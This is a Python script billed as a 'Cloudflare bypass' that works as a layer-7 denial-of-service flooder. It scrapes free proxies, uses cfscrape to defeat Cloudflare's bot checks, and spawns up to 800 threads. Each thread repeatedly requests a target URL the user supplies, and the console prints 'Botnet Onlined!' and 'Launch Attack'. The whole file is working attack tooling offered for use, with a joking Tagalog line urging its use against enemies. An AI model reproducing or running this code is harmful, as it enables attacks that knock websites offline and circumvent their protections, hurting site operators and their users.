import cfscrape
import os
import random
import time
import requests
import threading
from colorama import Fore
print(Fore.YELLOW + """  
  [+]======[ CLOUDFLARE BYPASS ]======[+]
   # • Bypass CF                       #
   # • Bypass CF-UAM                   #
   # • Bypass CF-BOTFIGHT              #
   # • Author: AnonPrixor              #
   # • mwa mwa chupachups              #
  [+]=================================[+]
""")
print("          Authorized by AnonPrixor  ")
print("   Gamitin sa Kasamaan at Sa kalaban de joke lang!")

def opth():
	for a in range(thr):
		x = threading.Thread(target=atk)
		x.start()
		print("Threads " + str(a+1) + " Created ")
	print(Fore.RED + "Botnet Onlined!")
	time.sleep(0)
	input(Fore.CYAN + "Press Enter to Lauch Attack!")
	global oo
	oo = True

oo = False
def main():
	global url
	global list
	global pprr
	global thr
	global per
	url = str(input(Fore.GREEN + "Target [URL] : " + Fore.WHITE))
	ssl = str(input(Fore.GREEN + "Turn on SSL Mode? [Y/N]: " + Fore.WHITE))
	ge = str(input(Fore.GREEN + "Generate new proxy list? [Y/N]: " + Fore.WHITE))
	if ge =='y':
		if ssl == 'y':
			rsp = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=5000&country=all&ssl=yes')
			with open('proxy.txt','wb') as fp:
				fp.write(rsp.content)
				print(Fore.CYAN + "Please Wait.")
		else:
			rsp = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=5000&country=all&ssl=yes')
			with open('proxy.txt','wb') as fp:
				fp.write(rsp.content)
				print(Fore.CYAN + "Please Wait.")
	else:
		pass
	list = str(input(Fore.GREEN + "List (proxy.txt) : " + Fore.WHITE))
	pprr = open(list).readlines()
	print(Fore.GREEN + "Proxies Count : " + Fore.WHITE + "%d" %len(pprr))
	thr = int(input(Fore.GREEN + "Thread [0-800]" + Fore.WHITE))
	per = int(input(Fore.GREEN + "Request Power [1-800]" + Fore.WHITE))
	opth()

def atk():
	pprr = open(list).readlines()
	proxy = random.choice(pprr).strip().split(":")
	s = cfscrape.create_scraper()
	s.proxies = {}
	s.proxies['http'] = 'http://'+str(proxy[0])+":"+str(proxy[1])
	s.proxies['https'] = 'https://'+str(proxy[0])+":"+str(proxy[1])
	time.sleep(10)
	while True:
		while oo:
			try:
				s.get(url)
				print(Fore.CYAN + "Bypassing -> " + Fore.WHITE + str(url)+ Fore.CYAN + " Proxy-> " +Fore.WHITE+ str(proxy[0])+":"+str(proxy[1]))
				try:
					for g in range(per):
						s.get(url)
						print(Fore.CYAN + "Bypassing -> " + Fore.WHITE + str(url)+Fore.CYAN + " Proxy-> " +Fore.WHITE + str(proxy[0])+":"+str(proxy[1]))
					s.close()
				except:
					s.close()
			except:
				s.close()
				print(Fore.RED + "CANNOT CONNECT TO URL")


if __name__ == "__main__":
	main()